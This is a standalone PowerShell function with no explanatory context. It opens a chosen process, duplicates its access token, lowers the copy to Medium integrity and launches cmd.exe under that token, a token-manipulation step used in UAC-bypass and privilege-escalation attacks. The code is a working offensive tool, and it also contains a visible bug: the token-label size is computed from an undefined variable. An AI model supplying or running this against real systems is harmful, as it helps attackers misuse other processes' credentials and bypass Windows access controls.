function TH {
param (
    [Parameter(Mandatory = $True)]
	[int]$Id
)  

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
	
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
	public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}
	
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
	public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
	public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
	public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
	public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
	public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
	public int length;
    public IntPtr lpSecurityDescriptor;
    public bool bInheritHandle;
}

[StructLayout(LayoutKind.Sequential)]
public struct TOKEN_OWNER
{
	public IntPtr Owner;
}

[StructLayout(LayoutKind.Sequential)]
public struct TOKEN_MANDATORY_LABEL
{
	public SID_AND_ATTRIBUTES Label;
}

[StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES
{
	public IntPtr Sid;
    public UInt32 Attributes;
}

public static class Kernel32
{
	[DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
		uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(
		string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes, 
		ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags, 
		IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, 
		out PROCESS_INFORMATION lpProcessInformation
    );
}
    
public static class Advapi32
{        
    [DllImport("advapi32.dll")]
    public static extern bool OpenProcessToken(
		IntPtr ProcessHandle,
        uint DesiredAccess,
        ref IntPtr TokenHandle
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(
		IntPtr hExistingToken,
        uint dwDesiredAccess,
        ref SECURITY_ATTRIBUTES lpTokenAttributes,
        uint ImpersonationLevel,
        uint TokenType,
        ref IntPtr phNewToken
    );

    [DllImport("advapi32.dll", CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        String lpApplicationName,
        String lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandle,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        String lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("advapi32.dll")]
    public static extern bool ConvertStringSidToSid(
		string StringSid,
        out IntPtr ptrSid
    );

    [DllImport("advapi32.dll")]
    public static extern bool GetLengthSid(
        IntPtr pSid
    );
}

public static class NtDll
{        
	[DllImport("ntdll.dll")]
	public static extern int NtSetInformationToken(
		IntPtr TokenHandle,
		int TokenInformationClass,
		ref TOKEN_MANDATORY_LABEL TokenInformation,
		int TokenInformationLength
    );
}
"@
$si = New-Object STARTUPINFO
$si.dwFlags = 0x1
$si.wShowWindow = 0x1
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si) # Struct Size
	
$pi = New-Object PROCESS_INFORMATION
	
$sa = New-Object SECURITY_ATTRIBUTES
$sa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($sa)
	
$hProcess = [Kernel32]::OpenProcess(0x1000,$false,$Id)
if($hProcess) {
	echo "[*] Opened Process"
} else {
    echo "[!] Failed to Open Process"
	Break
}

$hToken = [IntPtr]::Zero
if([Advapi32]::OpenProcessToken($hProcess,0x02000000,[ref]$hToken)) {
	echo "[*] Opened Process Token"
} else {
    echo "[!] Failed to Open Process Token"
	Break
}

$hNewToken = [IntPtr]::Zero
if([Advapi32]::DuplicateTokenEx($hToken, 0x02000000,[ref]$sa,2,1,[ref]$hNewToken)) {
	echo "[*] Duplicated Token"
} else {
    echo "[!] Failed to Duplicate Token"
	Break
}

$pSID = [IntPtr]::Zero
$StringSid = "S-1-16-8192"
if ([Advapi32]::ConvertStringSidToSid($stringSid,[ref]$pSID)) {
    echo "[*] Initialized Medium Integrity Level SID: $StringSid"
} else {
    echo "[!] Failed to initialize SID!"
	Break
}

$SID_AND_ATTRIBUTES = New-Object SID_AND_ATTRIBUTES
$SID_AND_ATTRIBUTES.Sid = $pSID
$SID_AND_ATTRIBUTES.Attributes = 0x20
$tml = New-Object TOKEN_MANDATORY_LABEL
$tml.Label = $SID_AND_ATTRIBUTES
$tmls = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL)

if([NtDll]::NtSetInformationToken($hNewToken,25,[ref]$tml,$tmls) -eq 0) {
	echo "[*] Lowered token to Medium Integrity"
} else {
    echo "[!] Failed modify token to Medium Integrity"
	Break
}

if([Advapi32]::CreateProcessAsUser($hNewToken,"C:\Windows\System32\cmd.exe",$false,[IntPtr]::Zero,[IntPtr]::Zero,$false,0x00000010,[IntPtr]::Zero,$Env:SystemRoot,[ref]$si,[ref]$pi)) {
	echo "[*] Process started`n"
} else {
    echo "[!] Failed to create process"
	Break
}
}
